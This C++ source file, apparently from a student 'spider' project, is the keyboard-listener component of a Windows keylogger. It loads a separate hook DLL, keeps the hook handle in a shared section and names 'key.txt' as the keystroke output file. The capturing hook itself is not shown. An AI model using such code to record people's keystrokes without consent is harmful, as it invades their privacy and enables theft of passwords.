//
// KeyboardListener.cpp for KeyboardListener in c:\Users\49207\Documents\Epitech-Rendu\cpp_spider\src\dll
//
// Made by Axel Drozdzynski
// Login   <drozdz_b>
//
// Started on  Sat Oct 6 19:25:34 2017 Axel Drozdzynski
// Last update Sat Oct 6 19:26:04 2017 Axel Drozdzynski
//

#include <fstream>
#include <thread>
#include <chrono>
#include <mutex>
#include <iostream>

#include "KeyboardListener.hh"

typedef int (*f_func)(std::list<std::string>&);

//#pragma comment(lib, "user32.lib")

bool quit = false;

#pragma data_seg(".shared")
HHOOK hook = 0;
HINSTANCE hDllInstance = 0;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.shared,RWS")

//HHOOK hook{ NULL };

HANDLE tmpHandle = NULL;
HWND hWindow = 0;
FILE *f1;

int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		std::cout << "Processe attached" << std::endl;
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

KeyboardListener::KeyboardListener()
{
	_FilenameOutput = "key.txt";
}

int KeyboardListener::run()
{
	std::cout << "KeyboardListener::run()" << std::endl;
	_dll = LoadLibrary("KBHook.dll");
	if (!_dll)
	{
		std::cerr << "Could not load the dynamic library KBHook" << std::endl;
		return (1);
	}
	return (0);
}

int KeyboardListener::stop()
{
	std::cout << "KeyboardListener::stop()" << std::endl;
	if (!FreeLibrary(_dll))
	{
		std::cerr << "Could not free the dynamic library KBHook" << std::endl;
	}
	return (0);
}

int KeyboardListener::getElements(std::list<std::string>& list)
{
	f_func getElem;

	getElem = (f_func)(GetProcAddress(_dll, "getElements"));
	getElem(list);
	return (0);
}
std::string KeyboardListener::getFilenameOutput()
{
	return (_FilenameOutput);
}

extern "C" __declspec(dllexport) KeyboardListener *create()
{
	return (new KeyboardListener);
}

extern "C" __declspec(dllexport) void destroy(KeyboardListener *obj)
{
	delete obj;
}